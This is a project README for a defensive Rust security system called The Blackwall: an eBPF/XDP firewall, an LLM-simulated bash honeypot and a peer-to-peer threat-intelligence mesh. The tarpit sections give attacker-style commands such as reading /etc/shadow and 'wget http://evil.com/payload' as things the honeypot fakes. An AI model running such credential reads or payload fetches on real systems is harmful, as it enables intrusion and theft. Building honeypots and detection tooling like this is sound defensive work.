<p align="center">
  <strong>🌐 Language:</strong>
  <a href="README.md">English</a> |
  <a href="README_UA.md">Українська</a> |
  <a href="README_RU.md">Русский</a>
</p>

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?font=JetBrains+Mono&weight=800&size=45&duration=3000&pause=1000&color=FF0000&center=true&vCenter=true&width=600&lines=THE+BLACKWALL" alt="The Blackwall">
  <br>
  <em>Adaptive eBPF Firewall with AI Honeypot & P2P Threat Mesh</em>
</p>

# The Blackwall — I built a real Blackwall because Cyberpunk 2077 broke my brain

<p align="center">
<img src="https://img.shields.io/badge/language-Rust-orange?style=for-the-badge&logo=rust" />
<img src="https://img.shields.io/badge/kernel-eBPF%2FXDP-blue?style=for-the-badge" />
<img src="https://img.shields.io/badge/AI-Ollama%20LLM-green?style=for-the-badge" />
<img src="https://img.shields.io/badge/P2P-libp2p-purple?style=for-the-badge" />
<img src="https://img.shields.io/badge/vibe-Cyberpunk-red?style=for-the-badge" />
</p>

<p align="center">
<em>"There are things beyond the Blackwall that would fry a netrunner's brain at a mere glance."</em><br>
<strong>— Alt Cunningham, probably</strong>
</p>

<p align="center">
<strong>Currently building enterprise-grade AI automation at <a href="https://dokky.com.ua">Dokky</a></strong><br>
<strong>Enterprise licensing & consulting: <a href="mailto:xzcrpw1@gmail.com">xzcrpw1@gmail.com</a></strong>
</p>

---

**TL;DR:** Played Cyberpunk, got inspired, wrote a whole adaptive firewall that works inside the Linux kernel, catches threats with AI, traps attackers in a fake server powered by an LLM, and shares threat intel over a decentralized P2P mesh.
**~21k lines of Rust. 298 tests. 10 crates. One person.**

---

## What is it?

The **Blackwall** — named after the digital barrier from Cyberpunk 2077 that keeps rogue AIs from eating the civilized Net.

This is my version. A multi-layered defense system that doesn't just block threats — it studies them, traps them, and tells every other node what it found.

Three core layers working together:

**1. Kernel-level firewall (eBPF/XDP)** — packet analysis happens inside the Linux kernel before traffic even hits the network stack. Nanosecond decisions. Entropy analysis, TLS fingerprinting, deep packet inspection, rate limiting, connection tracking — all running in the BPF virtual machine.

**2. AI-powered TCP honeypot (Tarpit)** — instead of just dropping malicious traffic, it gets redirected to a fake Linux server. An LLM simulates bash, responds to commands, serves fake files, acts like a compromised `root@web-prod-03`. Attackers waste their time while everything gets recorded.

**3. P2P threat intelligence mesh (HiveMind)** — nodes discover each other, exchange IoCs over an encrypted libp2p network, vote on threats through consensus, track peer reputation. One node catches a scanner — every node knows about it within seconds.

Plus: distributed sensor controller, enterprise SIEM integration API (STIX/TAXII/Splunk/QRadar/CEF), TUI dashboard, behavioral profiling per IP, threat feed ingestion, PCAP forensics.

---

## Architecture

![Blackwall Architecture](assets/architecture.svg)

![Threat Signal Flow](assets/signal-flow.svg)

**The pipeline:**

```
Packet arrives
  → XDP: entropy check, blocklist/allowlist, CIDR match, rate limit, JA4 capture, DPI
  → RingBuf (zero-copy) → Userspace daemon
  → Static rules → Behavioral state machine → JA4 DB lookup → LLM classification
  → Verdict: PASS / DROP / REDIRECT_TO_TARPIT
  → eBPF BLOCKLIST map updated in real-time
  → IoC shared to HiveMind P2P mesh
```

---

## What Each Crate Does

### blackwall-ebpf — The Kernel Layer (1,334 lines)

eBPF programs at the XDP hook — the earliest point where a packet can be touched. Runs under strict BPF verifier rules: 512-byte stack, no heap, no floats, bounded loops.

- **Entropy calculation** — byte frequency analysis, integer-only Shannon entropy (0–7936 scale). High entropy on non-TLS ports → encrypted C2 traffic
- **TLS fingerprinting** — parses ClientHello, extracts cipher suites, extensions, ALPN, SNI → JA4 fingerprint. One fingerprint covers thousands of bots using the same TLS lib
- **DPI via tail calls** — `PROG_ARRAY` dispatches protocol-specific analyzers:
  - HTTP: method + URI (catches `/wp-admin`, `/phpmyadmin`, path traversal)
  - DNS: query length + label count (DNS tunneling detection)
  - SSH: banner fingerprinting (`libssh`, `paramiko`, `dropbear`)
- **DNAT redirect** — suspicious traffic silently NAT'd to the tarpit. Attacker has no idea they left the real server
- **Connection tracking** — stateful TCP flow monitoring, LRU map (16K entries)
- **Rate limiting** — per-IP token bucket, prevents flood attacks and RingBuf exhaustion
- **4 RingBuf channels** — EVENTS, TLS_EVENTS, EGRESS_EVENTS, DPI_EVENTS for different event types

Maps: `BLOCKLIST`, `ALLOWLIST`, `CIDR_RULES`, `COUNTERS`, `RATE_LIMIT`, `CONN_TRACK`, `NAT_TABLE`, `TARPIT_TARGET`, `PROG_ARRAY`, plus 4 RingBuf maps.

### blackwall — The Brain (6,362 lines)

Main daemon. Loads eBPF programs, consumes RingBuf events, runs the decision pipeline.

- **Rules engine** — static blocklist/allowlist, CIDR ranges from config + feeds
- **Behavioral state machine** — per-IP profiling: connection frequency, port diversity, entropy distribution, timing analysis. Phases: `New → Suspicious → Malicious → Blocked` (or `→ Trusted`). Beaconing detection via integer CoV
- **JA4 database** — TLS fingerprint matching against known-bad signatures
- **AI classification** — Ollama integration, models ≤3B params (Qwen3 1.7B/0.6B). Event batching, structured JSON verdicts with confidence
- **Threat feeds** — external feed ingestion (Firehol, abuse.ch), periodic refresh
- **PCAP capture** — forensic recording with rotation + compression
- **Real-time feedback** — verdicts written back to eBPF BLOCKLIST map
- **HiveMind bridge** — confirmed IoCs shared to the P2P mesh

### tarpit — The Trap (2,179 lines)

A deception layer. Attackers redirected here via DNAT think they've landed on a real box.

- **Protocol auto-detect** — identifies SSH, HTTP, MySQL, DNS from first bytes
- **Protocol handlers:**
  - SSH: banner, auth flow, PTY session
  - HTTP: fake WordPress, `/wp-admin`, `.env`, realistic headers
  - MySQL: handshake, auth, query responses with fake data
  - DNS: plausible query responses
- **LLM bash sim** — every shell command → Ollama. `ls -la` returns files, `cat /etc/shadow` returns hashes, `wget` "downloads", `mysql -u root` "connects". The LLM doesn't know it's a honeypot
- **Exponential jitter** — 1-15 byte chunks, 100ms–30s delay. Maximum time waste
- **Anti-fingerprinting** — randomized TCP window, TTL, initial delay. Invisible to p0f/Nmap
- **Prompt injection defense** — 25+ patterns detected, never breaks the sim
- **Credential canaries** — all entered credentials logged for forensics
- **Session management** — per-connection state, command history, CWD tracking

### hivemind — The Mesh (6,526 lines)

Decentralized threat intelligence built on libp2p.

- **Transport** — QUIC + Noise encryption, every connection authenticated
- **Discovery** — Kademlia DHT (global), mDNS (local), configurable seed peers
- **IoC sharing** — GossipSub pub/sub, propagation across the mesh in seconds
- **Consensus** — N independent confirmations required. No single-source trust
- **Reputation** — peers earn rep for good IoCs, lose it for false positives. Bad actors get slashed
- **Sybil guard** — PoW challenges for new peers, self-ref detection in k-buckets, rate-limited registration
- **Federated learning** — local model training + FedAvg aggregation, gradient sharing (FHE encryption stub)
- **Data poisoning defense** — gradient distribution monitoring, model inversion detection
- **ZKP infrastructure** — Groth16 circuit stubs for trustless IoC verification

### hivemind-api — Enterprise Integration (2,711 lines)

REST API for plugging HiveMind data into enterprise SIEMs.

- **STIX 2.1** — standard threat intel format
- **TAXII 2.1** — threat exchange protocol
- **Splunk HEC** — HTTP Event Collector
- **QRadar LEEF** — Log Event Extended Format
- **CEF** — Common Event Format
- **Tiered licensing** — Basic / Professional / Enterprise / NationalSecurity
- **Live stats** — real-time XDP counters + P2P mesh metrics

### hivemind-dashboard — The Monitor (571 lines)

TUI dashboard. Pure ANSI — no ratatui, no crossterm, raw escape codes. Polls hivemind-api for live mesh status.

### blackwall-controller — Command & Control (356 lines)

Multi-sensor management CLI. HMAC-authenticated (PSK). Query stats, list blocked IPs, check health across all your Blackwall nodes from one place.

### common — The Contract (1,126 lines)

`#[repr(C)]` types shared between kernel and userspace: `PacketEvent`, `RuleKey`, `TlsComponentsEvent`, `DpiEvent`, counters, base64 utils. The contract that both sides agree on.

### xtask — Build Tools (46 lines)

`cargo xtask build-ebpf` — handles nightly + `bpfel-unknown-none` target compilation.

---

## Tech Stack

| Layer | Tech | Why |
|-------|------|-----|
| Kernel | **aya-rs** (eBPF/XDP) | Pure Rust eBPF — no C, no libbpf |
| Runtime | **Tokio** (current_thread) | Single-threaded, no overhead |
| IPC | **RingBuf** | Zero-copy, 7.5% overhead vs PerfEventArray's 35% |
| Concurrency | **papaya** + **crossbeam** | Lock-free maps + MPMC queues |
| P2P | **libp2p** | QUIC, Noise, Kademlia, GossipSub, mDNS |
| Crypto | **ring** | ECDSA, SHA256, HKDF, HMAC |
| HTTP | **hyper** 1.x | Minimal. No web framework |
| AI | **Ollama** | Local inference, GGUF quantized |
| Config | **TOML** | Clean, human-readable |
| Logging | **tracing** | Structured. Zero `println!` in prod |

**22 dependencies total.** Each one justified. No bloat crates.

---

## Deployment

```
deploy/
  docker/
    Dockerfile.blackwall       # Multi-stage, stripped binary
    Dockerfile.ebpf            # Nightly eBPF build
  helm/
    blackwall/                 # K8s DaemonSet + ConfigMap
  systemd/
    server/                    # Production server units
    laptop/                    # Dev/laptop units
  examples/                    # Example configs
  healthcheck.sh               # Component health checker
```

Docker multi-stage builds. Helm chart for K8s (DaemonSet, one per node, `CAP_BPF`). systemd units for bare metal.

---

## Quick Start

### Prerequisites

- Linux 5.15+ with BTF (or WSL2 custom kernel)
- Rust stable + nightly with `rust-src`
- `bpf-linker` — `cargo install bpf-linker`
- Ollama (optional, for AI features)

### Build

```bash
cargo xtask build-ebpf                      # eBPF programs (nightly)
cargo build --release --workspace            # all userspace
cargo clippy --workspace -- -D warnings      # lint
cargo test --workspace                       # 298 tests
```

### Run

```bash
sudo RUST_LOG=info ./target/release/blackwall config.toml    # needs root/CAP_BPF
RUST_LOG=info ./target/release/tarpit                        # honeypot
RUST_LOG=info ./target/release/hivemind                      # P2P node
RUST_LOG=info ./target/release/hivemind-api                  # threat feed API
./target/release/hivemind-dashboard                          # TUI
BLACKWALL_PSK=<key> ./target/release/blackwall-controller stats <ip>:<port>
```

### Config

```toml
[network]
interface = "eth0"
xdp_mode = "generic"          # generic / native / offload

[thresholds]
entropy_anomaly = 6000         # 0-7936 scale

[tarpit]
enabled = true
port = 2222
base_delay_ms = 100
max_delay_ms = 30000

[tarpit.services]
ssh_port = 22
http_port = 80
mysql_port = 3306
dns_port = 53

[ai]
enabled = true
ollama_url = "http://localhost:11434"
model = "qwen3:1.7b"
fallback_model = "qwen3:0.6b"

[rules]
blocklist = ["1.2.3.4"]
allowlist = ["127.0.0.1"]

[feeds]
enabled = true
refresh_interval_secs = 3600

[pcap]
enabled = true
output_dir = "/var/lib/blackwall/pcap"

[distributed]
enabled = false
mode = "standalone"
bind_port = 9471
psk = "your-256bit-hex-key"
```

---

## The Tarpit in Action

Connect to the tarpit and you see:

```
Ubuntu 24.04.2 LTS web-prod-03 tty1

web-prod-03 login: root
Password:
Last login: Thu Mar 27 14:22:33 2025 from 10.0.0.1

root@web-prod-03:~#
```

None of this is real. The LLM plays bash. `ls` shows files. `cat /etc/passwd` shows users. `mysql -u root -p` connects you. `wget http://evil.com/payload` downloads.

30 minutes on a server that doesn't exist. Every keystroke recorded. IoCs shared to the mesh.

---

## Security Model

- Every byte from packets = attacker-controlled. All `ctx.data()` bounds-checked
- Zero `unwrap()` in prod — `?`, `expect("reason")`, or `match`
- Prompt injection: expected. 25+ patterns caught, simulation never breaks
- P2P: Sybil guard (PoW + reputation slashing), N-of-M consensus on IoCs
- Tarpit: TCP randomization — p0f/Nmap can't fingerprint it
- Controller: HMAC-authenticated, no unauthenticated access
- Kernel: rate limiting prevents RingBuf exhaustion
- Shutdown: cleans up firewall rules, no orphaned iptables state

---

## Enterprise Edition

**[Blackwall Enterprise](https://github.com/xzcrpw/blackwall-enterprise)** adds something no one else has: **real-time Agent-to-Agent (A2A) traffic analysis at the kernel level.**

AI agents are starting to talk to each other — LLM-to-LLM, via MCP, A2A protocol, agent frameworks. This creates a new attack surface: prompt injection through inter-agent communication, intent spoofing, identity theft between agents. Nothing on the market handles this. Blackwall Enterprise is the first and only such module.

**~8,400 lines of Rust.** Separate repo, separate license.

| Component | What it does |
|-----------|-------------|
| **A-JWT Validation** | Agentic JWT verification per IETF draft. Signature check via `ring`, replay prevention, key caching |
| **Intent Verification** | Exhaustive field matching — `max_amount`, `allowed_recipients` (glob), action allowlisting |
| **Agent Checksum** | SHA256(system_prompt + tools_config) — tampering = instant block |
| **Proof-of-Possession** | cnf/jwk ECDSA binding — proves the agent holds its key |
| **eBPF Uprobes** | Hooks OpenSSL/GnuTLS `SSL_write`/`SSL_read` — intercepts A2A plaintext without breaking TLS |
| **Risk-Based Routing** | Configurable policy: allow / review / block based on risk score |
| **ZK Proofs** | Violation attestation without exposing raw traffic (Groth16) |
| **P2P Gossip** | Violation proofs broadcast to HiveMind mesh |

**Licensing:** [xzcrpw1@gmail.com](mailto:xzcrpw1@gmail.com)

---

## Stats

```
Language:        100% Rust
Total:           ~21,200 lines
Files:           92 .rs
Crates:          10
Tests:           298
unwrap():        0 in prod
Dependencies:    22 (audited)
eBPF stack:      ≤ 512 bytes always
Clippy:          -D warnings, zero issues
CI:              check + clippy + tests + eBPF nightly build
```

---

## Cyberpunk Reference

| Cyberpunk 2077 | This Project |
|----------------|-------------|
| The Blackwall | Kernel-level eBPF/XDP firewall |
| ICE | XDP fast-path: entropy + JA4 + DPI + DNAT |
| Daemons | LLM tarpit — fake server behind the wall |
| NetWatch | Behavioral engine + per-IP state machine |
| Rogue AIs | Botnets, scanners, C2 beacons |
| Braindance recordings | PCAP forensics |
| Netrunner collective | HiveMind P2P mesh |
| Fixer intel | Threat feeds |
| Arasaka C&C | Distributed controller |

---

## Disclaimer

Security research project. For defending your own infrastructure. Don't use it against others.

Not affiliated with CD Projekt Red. Just a game that rewired my brain in the best way possible.

---

## License

**BSL 1.1** (Business Source License)

Licensor: Vladyslav Soliannikov
Change Date: April 8, 2030
Change License: Apache-2.0

---

<p align="center">
<strong>Like what you see? <a href="https://github.com/xzcrpw/blackwall">Star the repo</a></strong>
</p>

<p align="center">
<strong><em>"Wake up, samurai. We have a network to protect."</em></strong>
</p>
